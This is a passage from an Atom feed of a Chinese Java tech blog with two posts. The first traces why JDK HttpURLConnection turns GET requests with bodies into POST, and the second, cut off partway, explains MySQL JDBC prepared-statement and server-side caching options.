<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KL&#39;s blog</title>
  
  <subtitle>世事洞明皆学问，人情练达即文章</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qsli.github.io/"/>
  <updated>2020-05-12T17:22:39.869Z</updated>
  <id>http://qsli.github.io/</id>
  
  <author>
    <name>Kevin Leo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JDK的HttpURLConnection强制把GET请求转成了POST</title>
    <link href="http://qsli.github.io/2020/05/13/jdk-httpurlconnection-pit/"/>
    <id>http://qsli.github.io/2020/05/13/jdk-httpurlconnection-pit/</id>
    <published>2020-05-12T17:22:39.000Z</published>
    <updated>2020-05-12T17:22:39.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>升级了下feign底层的client，换成了httpclient，然后qa同学在测试的时候，发现有一个接口挂了。</p><img src="/2020/05/13/jdk-httpurlconnection-pit/image-20200513005934085.png"><p>接口如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询房间信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> roomQueryParam</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Headers</span>(HttpConstants.HEADER_CONTENT_TYPE_JSON)</span><br><span class="line"><span class="meta">@RequestLine</span>(<span class="string">"GET /room/queryRooms"</span>)</span><br><span class="line"><span class="function">List&lt;RoomDTO&gt; <span class="title">queryRooms</span><span class="params">(@Valid RoomQueryParam roomQueryParam)</span></span>;</span><br></pre></td></tr></table></figure><p>接口上声明的是GET方法，再看controller的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询房间信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> roomQueryParam</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/queryRooms"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="meta">@ApiOperation</span>(value = <span class="string">"条件查询房间信息"</span>, httpMethod = <span class="string">"POST"</span>, produces = <span class="string">"application/json;charset=UTF-8"</span>, consumes = <span class="string">"application/json;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;RoomDTO&gt; <span class="title">queryRooms</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  @Valid @NotNull @RequestBody @ApiParam(value = <span class="string">"房间查询参数"</span>, required = <span class="keyword">true</span>)</span> RoomQueryParam roomQueryParam) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> roomService.queryRooms(roomQueryParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>controller上只允许POST请求</strong>，但是线上一直是ok的。</p><p>看feign的日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">2020-05-12 22:20:59.051 INFO [pms-api,de87cf7f069503a3,de87cf7f069503a3,<span class="literal">true</span>] --- [o-10026-exec-14] http.consumer.log                        : [GalaxyRoomRemote<span class="comment">#queryRooms]</span></span><br><span class="line">GET http://192.168.16.212:10024/room/queryRooms HTTP/1.1</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Content-Length: 86</span><br><span class="line">appCode: pms</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"chainId"</span> : 114,</span><br><span class="line">  <span class="string">"roomNo"</span> : <span class="string">"8235"</span>,</span><br><span class="line">  <span class="string">"roomTypeId"</span> : [ ],</span><br><span class="line">  <span class="string">"cleanState"</span> : [ ]</span><br><span class="line">&#125;</span><br><span class="line"> &lt;--- HTTP/1.1 200  elapsed : 13 ms</span><br><span class="line">connection: keep-alive</span><br><span class="line">content-type: application/json;charset=UTF-8</span><br><span class="line">date: Tue, 12 May 2020 14:20:59 GMT</span><br><span class="line">keep-alive: timeout=20</span><br><span class="line">transfer-encoding: chunked</span><br><span class="line">zipkin-trace-id: de2d912a29ae1a91</span><br><span class="line"> &lt;--- END HTTP (468-byte body)</span><br></pre></td></tr></table></figure><p><strong>确实是GET请求！</strong> 再看server端的tomcat的access日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2020-05-12 22:20:59.050 INFO [galaxy,de2d912a29ae1a91,de2d912a29ae1a91,<span class="literal">false</span>] --- [io-10024-exec-7] http.request.response.log                :</span><br><span class="line">POST http://192.168.16.212:10024/room/queryRooms?</span><br><span class="line">content-type: application/json;charset=UTF-8</span><br><span class="line">appcode: pms</span><br><span class="line">accept: */*</span><br><span class="line">cache-control: no-cache</span><br><span class="line">pragma: no-cache</span><br><span class="line">user-agent: Java/1.8.0_171</span><br><span class="line">host: 192.168.16.212:10024</span><br><span class="line">connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;  <span class="string">"chainId"</span> : 114,  <span class="string">"roomNo"</span> : <span class="string">"8235"</span>,  <span class="string">"roomTypeId"</span> : [ ],  <span class="string">"cleanState"</span> : [ ]&#125;</span><br><span class="line"></span><br><span class="line">ret code 200, start time 1589293259041 --&gt; end time 1589293259050, cost: 9</span><br></pre></td></tr></table></figure><p><strong>神奇的是变成了POST请求</strong>！</p><h3 id="到底是什么请求？"><a href="#到底是什么请求？" class="headerlink" title="到底是什么请求？"></a>到底是什么请求？</h3><p>这俩日志肯定有一个撒了谎，这时候只有请出地藏菩萨了。用tcpdump抓包后发现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tcpdump -n -S -s 0 -A    dst port 8182   | grep <span class="string">"queryRooms"</span>  -C40 --color</span><br><span class="line"></span><br><span class="line">01:02:45.933534 IP 192.168.6.212.38430 &gt; 192.168.1.3.vmware-fdm: Flags [P.], seq 1572827156:1572827402, ack 904633996, win 981, options [nop,nop,TS val 1568347176 ecr 3383828365], length 246</span><br><span class="line">E..*..@.@.*.............].p.5.......r......</span><br><span class="line">]&#123;.(....POST /room/queryRooms HTTP/1.1</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">appCode: pms</span><br><span class="line">Accept: */*</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">User-Agent: Java/1.8.0_171</span><br><span class="line">Host: 192.168.1.3:8182</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 89</span><br></pre></td></tr></table></figure><p>tcp包，告诉我们这是一个post！</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><h3 id="初步定位"><a href="#初步定位" class="headerlink" title="初步定位"></a>初步定位</h3><p>简单写了个单测，debug了下新旧代码，发现了经过下面的代码之后，请求方式就变了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sun.net.www.protocol.http.HttpURLConnection#getOutputStream0</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> OutputStream <span class="title">getOutputStream0</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!doOutput) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ProtocolException(<span class="string">"cannot write to a URLConnection"</span></span><br><span class="line">                               + <span class="string">" if doOutput=false - call setDoOutput(true)"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (method.equals(<span class="string">"GET"</span>)) &#123;</span><br><span class="line">                method = <span class="string">"POST"</span>; <span class="comment">// Backward compatibility</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">// 省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜了下， 发现了stackoverflow上有人问过了：</p><blockquote><p>The <code>httpCon.setDoOutput(true);</code> implicitly set the request method to POST because that’s the default method whenever you want to send a request body.</p><p>If you want to use GET, remove that line and remove the <code>OutputStreamWriter out = new OutputStreamWriter(httpCon.getOutputStream());</code> line. You don’t need to send a request body for GET requests.</p></blockquote><p>升级为httpclient， 就没有这个兼容，直接就报错了。至于为啥要升级成httpclient，因为feign默认的是没有连接池的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// feign.Client.Default#convertAndSend</span></span><br><span class="line"> <span class="function">HttpURLConnection <span class="title">convertAndSend</span><span class="params">(Request request, Options options)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">   <span class="comment">// 每次打开一个连接   </span></span><br><span class="line">   <span class="keyword">final</span> HttpURLConnection</span><br><span class="line">          connection =</span><br><span class="line">          (HttpURLConnection) <span class="keyword">new</span> URL(request.url()).openConnection();</span><br><span class="line">      <span class="keyword">if</span> (connection <span class="keyword">instanceof</span> HttpsURLConnection) &#123;</span><br><span class="line">        HttpsURLConnection sslCon = (HttpsURLConnection) connection;</span><br><span class="line">        <span class="keyword">if</span> (sslContextFactory != <span class="keyword">null</span>) &#123;</span><br><span class="line">          sslCon.setSSLSocketFactory(sslContextFactory);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (hostnameVerifier != <span class="keyword">null</span>) &#123;</span><br><span class="line">          sslCon.setHostnameVerifier(hostnameVerifier);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      connection.setConnectTimeout(options.connectTimeoutMillis());</span><br><span class="line">      connection.setReadTimeout(options.readTimeoutMillis());</span><br><span class="line">      connection.setAllowUserInteraction(<span class="keyword">false</span>);</span><br><span class="line">      connection.setInstanceFollowRedirects(<span class="keyword">true</span>);</span><br><span class="line">      connection.setRequestMethod(request.method());</span><br><span class="line"></span><br><span class="line">      Collection&lt;String&gt; contentEncodingValues = request.headers().get(CONTENT_ENCODING);</span><br><span class="line">      <span class="keyword">boolean</span></span><br><span class="line">          gzipEncodedRequest =</span><br><span class="line">          contentEncodingValues != <span class="keyword">null</span> &amp;&amp; contentEncodingValues.contains(ENCODING_GZIP);</span><br><span class="line">      <span class="keyword">boolean</span></span><br><span class="line">          deflateEncodedRequest =</span><br><span class="line">          contentEncodingValues != <span class="keyword">null</span> &amp;&amp; contentEncodingValues.contains(ENCODING_DEFLATE);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">boolean</span> hasAcceptHeader = <span class="keyword">false</span>;</span><br><span class="line">      Integer contentLength = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">for</span> (String field : request.headers().keySet()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (field.equalsIgnoreCase(<span class="string">"Accept"</span>)) &#123;</span><br><span class="line">          hasAcceptHeader = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (String value : request.headers().get(field)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (field.equals(CONTENT_LENGTH)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!gzipEncodedRequest &amp;&amp; !deflateEncodedRequest) &#123;</span><br><span class="line">              contentLength = Integer.valueOf(value);</span><br><span class="line">              connection.addRequestProperty(field, value);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            connection.addRequestProperty(field, value);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Some servers choke on the default accept string.</span></span><br><span class="line">      <span class="keyword">if</span> (!hasAcceptHeader) &#123;</span><br><span class="line">        connection.addRequestProperty(<span class="string">"Accept"</span>, <span class="string">"*/*"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (request.body() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (contentLength != <span class="keyword">null</span>) &#123;</span><br><span class="line">          connection.setFixedLengthStreamingMode(contentLength);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          connection.setChunkedStreamingMode(<span class="number">8196</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">        OutputStream out = connection.getOutputStream();</span><br><span class="line">        <span class="keyword">if</span> (gzipEncodedRequest) &#123;</span><br><span class="line">          out = <span class="keyword">new</span> GZIPOutputStream(out);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (deflateEncodedRequest) &#123;</span><br><span class="line">          out = <span class="keyword">new</span> DeflaterOutputStream(out);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          out.write(request.body());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            out.close();</span><br><span class="line">          &#125; <span class="keyword">catch</span> (IOException suppressed) &#123; <span class="comment">// NOPMD</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> connection;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="GET可以有BODY吗？"><a href="#GET可以有BODY吗？" class="headerlink" title="GET可以有BODY吗？"></a>GET可以有BODY吗？</h3><p>mdn:</p><blockquote><p>The final part of the request is its body. Not all requests have one: requests fetching resources, like <code>GET</code>, <code>HEAD</code>, <code>DELETE</code>, or <code>OPTIONS</code>, usually don’t need one. Some requests send data to the server in order to update it: as often the case with <code>POST</code> requests (containing HTML form data).</p></blockquote><p>Stackoverflow:</p><blockquote><p>The RFC2616 referenced as “HTTP/1.1 spec” is now obsolete. In 2014 it was replaced by RFCs 7230-7237. Quote “the message-body SHOULD be ignored when handling the request” has been deleted. It’s now just “Request message framing is independent of method semantics, even if the method doesn’t define any use for a message body” The 2nd quote “The GET method means retrieve whatever information … is identified by the Request-URI” was deleted. - From a comment</p></blockquote><p>早期是不让有body的，JDK这么做也是有历史原因的。</p><p>后来RFC更新了，GET可以有body，一般不建议这么做。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://stackoverflow.com/questions/8760052/httpurlconnection-sends-a-post-request-even-though-httpcon-setrequestmethodget" rel="external nofollow noopener noreferrer" target="_blank">java - HttpURLConnection sends a POST request even though httpCon.setRequestMethod(“GET”); is set - Stack Overflow</a></li><li><a href="https://stackoverflow.com/questions/978061/http-get-with-request-body" rel="external nofollow noopener noreferrer" target="_blank">rest - HTTP GET with request body - Stack Overflow</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages" rel="external nofollow noopener noreferrer" target="_blank">HTTP Messages - HTTP | MDN</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;现象&quot;&gt;&lt;a href=&quot;#现象&quot; class=&quot;headerlink&quot; title=&quot;现象&quot;&gt;&lt;/a&gt;现象&lt;/h2&gt;&lt;p&gt;升级了下feign底层的client，换成了httpclient，然后qa同学在测试的时候，发现有一个接口挂了。&lt;/p&gt;
&lt;img src=
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="HttpURLConnection" scheme="http://qsli.github.io/tags/HttpURLConnection/"/>
    
  </entry>
  
  <entry>
    <title>jdbc预编译缓存加速sql执行</title>
    <link href="http://qsli.github.io/2020/05/05/cache-prep-stmts/"/>
    <id>http://qsli.github.io/2020/05/05/cache-prep-stmts/</id>
    <published>2020-05-04T16:21:27.000Z</published>
    <updated>2020-05-04T16:21:27.855Z</updated>
    
    <content type="html"><![CDATA[<p><code>PreparedStatement</code>可以防止sql注入，这个大家都知道；今天来聊聊他对性能的提升。</p><h2 id="SQL-syntax"><a href="#SQL-syntax" class="headerlink" title="SQL syntax"></a>SQL syntax</h2><p>SQL syntax for prepared statements is based on three SQL statements:</p><ul><li><a href="https://dev.mysql.com/doc/refman/5.7/en/prepare.html" rel="external nofollow noopener noreferrer" target="_blank"><code>PREPARE</code></a> prepares a statement for execution (see <a href="https://dev.mysql.com/doc/refman/5.7/en/prepare.html" rel="external nofollow noopener noreferrer" target="_blank">Section 13.5.1, “PREPARE Statement”</a>).</li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/execute.html" rel="external nofollow noopener noreferrer" target="_blank"><code>EXECUTE</code></a> executes a prepared statement (see <a href="https://dev.mysql.com/doc/refman/5.7/en/execute.html" rel="external nofollow noopener noreferrer" target="_blank">Section 13.5.2, “EXECUTE Statement”</a>).</li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/deallocate-prepare.html" rel="external nofollow noopener noreferrer" target="_blank"><code>DEALLOCATE PREPARE</code></a> releases a prepared statement (see <a href="https://dev.mysql.com/doc/refman/5.7/en/deallocate-prepare.html" rel="external nofollow noopener noreferrer" target="_blank">Section 13.5.3, “DEALLOCATE PREPARE Statement”</a>).</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; PREPARE stmt1 FROM 'SELECT * FROM words where id = ?';</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">Statement prepared</span><br><span class="line"></span><br><span class="line">mysql&gt; SET @i=1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; EXECUTE stmt1 USING @i;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">SET</span> @i=<span class="number">2</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; EXECUTE stmt1 USING @i;</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">| id | word |</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">|  2 | 123  |</span><br><span class="line">+<span class="comment">----+------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">deallocate</span> <span class="keyword">prepare</span> stmt1;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; EXECUTE stmt1 USING @i;</span><br><span class="line">ERROR 1243 (HY000): Unknown prepared statement <span class="keyword">handler</span> (stmt1) given <span class="keyword">to</span> <span class="keyword">EXECUTE</span></span><br></pre></td></tr></table></figure><h2 id="MySQL-Connector-J"><a href="#MySQL-Connector-J" class="headerlink" title="MySQL Connector/J"></a>MySQL Connector/J</h2><h3 id="普通的sql执行"><a href="#普通的sql执行" class="headerlink" title="普通的sql执行"></a>普通的sql执行</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="meta">@SneakyThrows</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPreCompile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  String connectString = <span class="string">"jdbc:mysql://localhost/test?user=root&amp;password=toor&amp;useLocalSessionState=true&amp;useSSL=false"</span>;</span><br><span class="line">  Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>)</span><br><span class="line">    .newInstance();</span><br><span class="line">  <span class="keyword">try</span> (Connection conn = DriverManager.getConnection(connectString)) &#123;</span><br><span class="line">    Stopwatch stopwatch = Stopwatch.createStarted();</span><br><span class="line">    <span class="keyword">try</span> (PreparedStatement psts = conn.prepareStatement(<span class="string">"delete from words where id = ?"</span>)) &#123;</span><br><span class="line">      psts.setInt(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">      psts.execute();</span><br><span class="line">      stopwatch.stop();</span><br><span class="line">      System.out.println(<span class="string">"stopwatch = "</span> + stopwatch.elapsed(TimeUnit.MILLISECONDS));</span><br><span class="line">      psts.setInt(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">      psts.execute();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wireshark抓包：</p><img src="/2020/05/05/cache-prep-stmts/image-20200504210731650.png"><p>mysql general log:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2020-05-04T13:06:07.883131Z   15 Connectroot@localhost on <span class="built_in">test</span> using TCP/IP</span><br><span class="line">2020-05-04T13:06:07.885668Z   15 Query/* mysql-connector-java-8.0.16 (Revision: 34cbc6bc61f72836e26327537a432d6db7c77de6) */SELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout</span><br><span class="line">2020-05-04T13:06:07.905021Z   15 QuerySET character_set_results = NULL</span><br><span class="line">2020-05-04T13:06:07.929557Z   15 Querydelete from words <span class="built_in">where</span> id = 1</span><br><span class="line">2020-05-04T13:06:07.934906Z   15 Querydelete from words <span class="built_in">where</span> id = 10</span><br><span class="line">2020-05-04T13:06:07.940645Z   15 Quit</span><br></pre></td></tr></table></figure><h3 id="with-useServerPrepStmts-true"><a href="#with-useServerPrepStmts-true" class="headerlink" title="with useServerPrepStmts=true"></a>with useServerPrepStmts=true</h3><blockquote><p><strong>useServerPrepStmts</strong></p><p>Use server-side prepared statements if the server supports them?</p><p>Default: false</p><p>Since version: 3.1.0</p></blockquote><p>jdbc的连接参数加上<code>useServerPrepStmts=true</code>：</p><img src="/2020/05/05/cache-prep-stmts/image-20200504211949686.png"><p>首选需要编译statement，请求如下：</p><img src="/2020/05/05/cache-prep-stmts/image-20200504212134794.png"><p>后面执行的时候，只传了对应的statement id 1和占位符对应的值 1，大大减少了网络的传输：</p><img src="/2020/05/05/cache-prep-stmts/image-20200504212218401.png"><p>mysql的general log如下，也是先prepare， 然后excute了两次， 最后关闭stmt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2020-05-04T13:15:55.611149Z   16 Connectroot@localhost on <span class="built_in">test</span> using TCP/IP</span><br><span class="line">2020-05-04T13:15:55.615655Z   16 Query/* mysql-connector-java-8.0.16 (Revision: 34cbc6bc61f72836e26327537a432d6db7c77de6) */SELECT  @@session.auto_increment_increment AS auto_increment_increment, @@character_set_client AS character_set_client, @@character_set_connection AS character_set_connection, @@character_set_results AS character_set_results, @@character_set_server AS character_set_server, @@collation_server AS collation_server, @@collation_connection AS collation_connection, @@init_connect AS init_connect, @@interactive_timeout AS interactive_timeout, @@license AS license, @@lower_case_table_names AS lower_case_table_names, @@max_allowed_packet AS max_allowed_packet, @@net_write_timeout AS net_write_timeout, @@performance_schema AS performance_schema, @@sql_mode AS sql_mode, @@system_time_zone AS system_time_zone, @@time_zone AS time_zone, @@transaction_isolation AS transaction_isolation, @@wait_timeout AS wait_timeout</span><br><span class="line">2020-05-04T13:15:55.640086Z   16 QuerySET character_set_results = NULL</span><br><span class="line">2020-05-04T13:15:55.672345Z   16 Preparedelete from words <span class="built_in">where</span> id = ?</span><br><span class="line">2020-05-04T13:15:55.676355Z   16 Executedelete from words <span class="built_in">where</span> id = 1</span><br><span class="line">2020-05-04T13:15:55.681600Z   16 Executedelete from words <span class="built_in">where</span> id = 10</span><br><span class="line">2020-05-04T13:15:55.681949Z   16 Close stmt</span><br><span class="line">2020-05-04T13:15:55.687659Z   16 Quit</span><br></pre></td></tr></table></figure><h3 id="cachePrepStmts和useServerPrepStmts同时打开"><a href="#cachePrepStmts和useServerPrepStmts同时打开" class="headerlink" title="cachePrepStmts和useServerPrepStmts同时打开"></a>cachePrepStmts和useServerPrepStmts同时打开</h3><blockquote><p><strong>cachePrepStmts</strong></p><p>Should the driver cache the parsing stage of PreparedStatements of client-side prepared statements, the “check” for suitability of server-side prepared and server-side prepared statements themselves?</p><p>Default: false</p><p>Since version: 3.0.10</p></blockquote><p>这里就是加上缓存，stmt close的时候，并不会把之前预编译的stmt给关闭，这个缓存是connection级别的。</p><figure class="highlight 